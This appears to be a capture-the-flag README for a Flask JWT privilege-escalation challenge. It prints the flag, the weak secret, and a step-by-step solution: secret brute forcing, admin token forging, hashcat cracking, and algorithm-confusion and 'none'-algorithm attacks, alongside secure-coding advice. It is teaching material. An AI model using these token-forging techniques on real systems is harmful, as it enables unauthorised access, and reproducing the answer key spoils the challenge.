# Auth Adventure

A web security challenge demonstrating authentication vulnerabilities and privilege escalation.

---

## Challenge Info

| Field | Value |
|-------|-------|
| **Name** | Auth Adventure |
| **Category** | Web Security |
| **Difficulty** | Medium |
| **Flag** | `DSCCTF{4UTH_4DV3NTUR3_C0MPL3T3_2026}` |
| **Author** | ShadowPB |
| **Port** | 8003 |

---

## Challenge Description

üîê This web application uses JWT (JSON Web Tokens) for user authentication. You can login with regular user credentials, but the flag is only accessible to admin users.

Your mission: Break out of the user role and escalate your privileges to admin!

**Test Credentials:**
- Username: `user`  
- Password: `password123`

---

## Files

- `app.py` - Flask web application
- `requirements.txt` - Python dependencies
- `solve.py` - Complete exploitation script
- `flag.txt` - Target flag
- `description.md` - Challenge description
- `Dockerfile` - Container setup
- `docker-compose.yml` - Easy deployment

---

## Quick Start

### Local Testing
```bash
# Install dependencies
pip install -r requirements.txt

# Run the application
python3 app.py

# Visit http://localhost:8003
```

### Docker Deployment
```bash
# Build and run
docker-compose up -d

# Access at http://localhost:8003
```

### Automated Solution
```bash
# Run the exploit script
python3 solve.py
```

---

## Vulnerability Analysis

### Weak JWT Secret
The application uses a weak secret key for JWT signing:
```python
SECRET_KEY = "secret123"  # Easily guessable!
```

### JWT Token Structure
```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "username": "user",
    "role": "user",        // ‚Üê Target for escalation
    "user_id": 1001,
    "exp": 1704067200
  },
  "signature": "..."
}
```

---

## Solution Approach

### Step 1: Login and Token Analysis
```bash
# Login as regular user
curl -d "username=user&password=password123" http://localhost:8003/login

# Decode JWT token (without verification)
# Use jwt.io or base64 decode the payload
```

### Step 2: Secret Brute Force
```python
common_secrets = [
    "secret", "secret123", "password", "admin", 
    "jwt_secret", "key", "secretkey"
]

for secret in common_secrets:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Secret found: {secret}")
        break
    except jwt.InvalidTokenError:
        continue
```

### Step 3: Token Manipulation
```python
# Create malicious payload
malicious_payload = {
    'username': 'admin',
    'role': 'admin',      # Privilege escalation!
    'user_id': 1,
    'exp': 9999999999
}

# Sign with cracked secret
malicious_token = jwt.encode(malicious_payload, "secret123", algorithm='HS256')
```

### Step 4: Admin Access
```bash
# Use malicious token in cookie
curl -b "token=eyJ...malicious_token" http://localhost:8003/

# Should display admin flag
```

---

## Learning Objectives

- **JWT Security**: Understanding token-based authentication
- **Weak Secrets**: Impact of predictable cryptographic keys
- **Privilege Escalation**: Horizontal to vertical privilege movement
- **Token Manipulation**: Modifying JWT claims and signatures
- **Brute Force Attacks**: Systematic key recovery techniques

---

## JWT Security Best Practices

### ‚ùå Vulnerable Implementation
```python
SECRET_KEY = "secret123"                    # Weak secret
jwt.decode(token, SECRET_KEY, verify=False) # No verification
role = payload['role']                      # Direct trust
```

### ‚úÖ Secure Implementation
```python
SECRET_KEY = secrets.token_hex(32)          # Strong random secret
jwt.decode(token, SECRET_KEY, algorithms=['HS256']) # Strict verification
# Server-side role validation based on user ID
```

---

## Common JWT Vulnerabilities

| Vulnerability | Description | Impact |
|---------------|-------------|--------|
| Weak Secrets | Predictable signing keys | Token forgery |
| Algorithm Confusion | None/RS256 to HS256 | Signature bypass |
| Key Confusion | Public key as secret | Token forgery |
| Claims Trust | Direct payload trust | Privilege escalation |
| No Expiration | Tokens never expire | Persistent access |

---

## Exploitation Tools

### Manual Analysis
- [jwt.io](https://jwt.io) - Token decoder and debugger
- Browser Developer Tools - Cookie manipulation
- Burp Suite - Request interception

### Automated Tools
```bash
# JWT cracking tool
hashcat -m 16500 token.txt wordlist.txt

# JWT manipulation
python3 -c "
import jwt
token = 'eyJ...'
payload = jwt.decode(token, verify=False)
payload['role'] = 'admin'
new_token = jwt.encode(payload, 'secret123')
print(new_token)
"
```

---

## Advanced Techniques

### Algorithm Confusion Attack
```python
# Change algorithm from RS256 to HS256
header = {'alg': 'HS256', 'typ': 'JWT'}
token = jwt.encode(payload, public_key, headers=header)
```

### None Algorithm Attack
```python
# Remove signature requirement
header = {'alg': 'none', 'typ': 'JWT'}
payload = {'role': 'admin'}
# Token = base64(header) + "." + base64(payload) + "."
```

---

## Hints

1. Check `/hint` endpoint for additional clues
2. JWT tokens can be decoded at jwt.io without the secret
3. The secret key might be in a common password list
4. Pay attention to the token structure and claims
5. Admin access requires role escalation, not password cracking

This challenge demonstrates real-world JWT vulnerabilities commonly found in web applications.